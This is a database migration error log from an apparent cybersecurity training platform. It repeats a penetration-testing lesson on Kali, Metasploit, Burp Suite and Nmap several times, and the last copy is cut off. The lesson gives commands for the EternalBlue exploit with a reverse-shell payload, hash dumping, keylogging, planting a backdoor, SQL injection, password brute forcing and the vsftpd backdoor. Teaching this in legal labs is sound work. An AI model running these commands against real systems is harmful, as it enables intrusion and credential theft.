         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
Location   : db/migration/V4__Enhanced_Lesson_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V4__Enhanced_Lesson_Content.sql)
Line       : 210
Statement  : UPDATE lessons SET content = 
'# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you''ll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world''s most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin' OR '1'='1
7. Observe response for SQL errors or unexpected behavior
8. If vulnerable, escalate to full exploitation
```

## 4. Nmap (Network Mapper)

### Overview

Nmap is the industry-standard tool for network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (discover live hosts)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100
```

### NSE (Nmap Scripting Engine)

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats
nmap -oA scan_results 192.168.1.100
```

## Tool Selection Matrix

| Phase | Primary Tool | Alternative | Purpose |
|-------|--------------|-------------|---------|
| Reconnaissance | Nmap | Masscan | Network discovery |
| Web Testing | Burp Suite | OWASP ZAP | Web app security |
| Exploitation | Metasploit | Manual exploits | Vulnerability exploitation |
| Password Cracking | Hashcat | John the Ripper | Credential attacks |
| Post-Exploitation | Meterpreter | PowerShell Empire | Maintain access |

## Hands-On Lab Exercise

### Setup Your Testing Environment

**Step 1: Install Kali Linux**
```bash
# Download Kali Linux VM
# Import into VirtualBox/VMware
# Update system
sudo apt update && sudo apt upgrade -y
```

**Step 2: Install Metasploitable 2 (Vulnerable Target)**
```bash
# Download from SourceForge
# Import into same virtual network as Kali
# Default credentials: msfadmin/msfadmin
```

**Step 3: Practice Scanning**
```bash
# From Kali, scan Metasploitable
nmap -sV -A <metasploitable-ip>

# Identify open services
# Note vulnerable versions
```

**Step 4: Exploit a Vulnerability**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd exploit (known vulnerability in Metasploitable)
search vsftpd

# Use the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <metasploitable-ip>
exploit

# You should get a shell!
```

## Best Practices

### 1. Tool Maintenance
```bash
# Update Kali Linux regularly
sudo apt update && sudo apt full-upgrade -y

# Update Metasploit
msfupdate
```

### 2. Documentation
- Screenshot every step
- Save all command output
- Document findings immediately
- Use tools like CherryTree or KeepNote

### 3. Legal Compliance
- Only test systems you have permission to test
- Stay within defined scope
- Report findings responsibly
- Maintain confidentiality

### 4. Continuous Learning
- Follow security blogs (Offensive Security, Rapid7)
- Practice on legal platforms (HackTheBox, TryHackMe)
- Attend security conferences (DEF CON, Black Hat)
- Obtain certifications (OSCP, CEH, GPEN)

## Common Mistakes to Avoid

1. **Running scans without permission** → Legal consequences
2. **Using default settings** → Easily detected
3. **Not documenting findings** → Incomplete reports
4. **Ignoring false positives** → Wasted time
5. **Over-relying on automated tools** → Missing manual vulnerabilities

## Resources for Further Learning

### Official Documentation
- Kali Linux: https://www.kali.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- Nmap: https://nmap.org/book/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- VulnHub: https://www.vulnhub.com/

### Video Tutorials
- IppSec (HackTheBox walkthroughs)
- The Cyber Mentor
- John Hammond
- LiveOverflow

## Quiz Preparation

Test your knowledge:

1. What is the difference between Kali Linux and a regular Linux distribution?
2. Name three phases of penetration testing and the primary tool for each.
3. What is Meterpreter and why is it powerful?
4. How does Burp Suite''s Proxy component work?
5. What is the purpose of Nmap''s NSE scripts?

## Next Steps

In the next module, you''ll learn **Reconnaissance and Information Gathering** techniques, where you''ll use these tools to discover information about target systems before attempting exploitation.

Remember: **With great power comes great responsibility.** Always use these tools ethically and legally!'
WHERE section_id = 1 AND name = 'Penetration Testing Tools Overview'

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:243)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V4__Enhanced_Lesson_Content.sql failed
------------------------------------------------
SQL State  : 22P02
Error Code : 0
Message    : ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
Location   : db/migration/V4__Enhanced_Lesson_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V4__Enhanced_Lesson_Content.sql)
Line       : 210
Statement  : UPDATE lessons SET content = 
'# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you''ll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world''s most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin' OR '1'='1
7. Observe response for SQL errors or unexpected behavior
8. If vulnerable, escalate to full exploitation
```

## 4. Nmap (Network Mapper)

### Overview

Nmap is the industry-standard tool for network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (discover live hosts)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100
```

### NSE (Nmap Scripting Engine)

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats
nmap -oA scan_results 192.168.1.100
```

## Tool Selection Matrix

| Phase | Primary Tool | Alternative | Purpose |
|-------|--------------|-------------|---------|
| Reconnaissance | Nmap | Masscan | Network discovery |
| Web Testing | Burp Suite | OWASP ZAP | Web app security |
| Exploitation | Metasploit | Manual exploits | Vulnerability exploitation |
| Password Cracking | Hashcat | John the Ripper | Credential attacks |
| Post-Exploitation | Meterpreter | PowerShell Empire | Maintain access |

## Hands-On Lab Exercise

### Setup Your Testing Environment

**Step 1: Install Kali Linux**
```bash
# Download Kali Linux VM
# Import into VirtualBox/VMware
# Update system
sudo apt update && sudo apt upgrade -y
```

**Step 2: Install Metasploitable 2 (Vulnerable Target)**
```bash
# Download from SourceForge
# Import into same virtual network as Kali
# Default credentials: msfadmin/msfadmin
```

**Step 3: Practice Scanning**
```bash
# From Kali, scan Metasploitable
nmap -sV -A <metasploitable-ip>

# Identify open services
# Note vulnerable versions
```

**Step 4: Exploit a Vulnerability**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd exploit (known vulnerability in Metasploitable)
search vsftpd

# Use the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <metasploitable-ip>
exploit

# You should get a shell!
```

## Best Practices

### 1. Tool Maintenance
```bash
# Update Kali Linux regularly
sudo apt update && sudo apt full-upgrade -y

# Update Metasploit
msfupdate
```

### 2. Documentation
- Screenshot every step
- Save all command output
- Document findings immediately
- Use tools like CherryTree or KeepNote

### 3. Legal Compliance
- Only test systems you have permission to test
- Stay within defined scope
- Report findings responsibly
- Maintain confidentiality

### 4. Continuous Learning
- Follow security blogs (Offensive Security, Rapid7)
- Practice on legal platforms (HackTheBox, TryHackMe)
- Attend security conferences (DEF CON, Black Hat)
- Obtain certifications (OSCP, CEH, GPEN)

## Common Mistakes to Avoid

1. **Running scans without permission** → Legal consequences
2. **Using default settings** → Easily detected
3. **Not documenting findings** → Incomplete reports
4. **Ignoring false positives** → Wasted time
5. **Over-relying on automated tools** → Missing manual vulnerabilities

## Resources for Further Learning

### Official Documentation
- Kali Linux: https://www.kali.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- Nmap: https://nmap.org/book/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- VulnHub: https://www.vulnhub.com/

### Video Tutorials
- IppSec (HackTheBox walkthroughs)
- The Cyber Mentor
- John Hammond
- LiveOverflow

## Quiz Preparation

Test your knowledge:

1. What is the difference between Kali Linux and a regular Linux distribution?
2. Name three phases of penetration testing and the primary tool for each.
3. What is Meterpreter and why is it powerful?
4. How does Burp Suite''s Proxy component work?
5. What is the purpose of Nmap''s NSE scripts?

## Next Steps

In the next module, you''ll learn **Reconnaissance and Information Gathering** techniques, where you''ll use these tools to discover information about target systems before attempting exploitation.

Remember: **With great power comes great responsibility.** Always use these tools ethically and legally!'
WHERE section_id = 1 AND name = 'Penetration Testing Tools Overview'

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
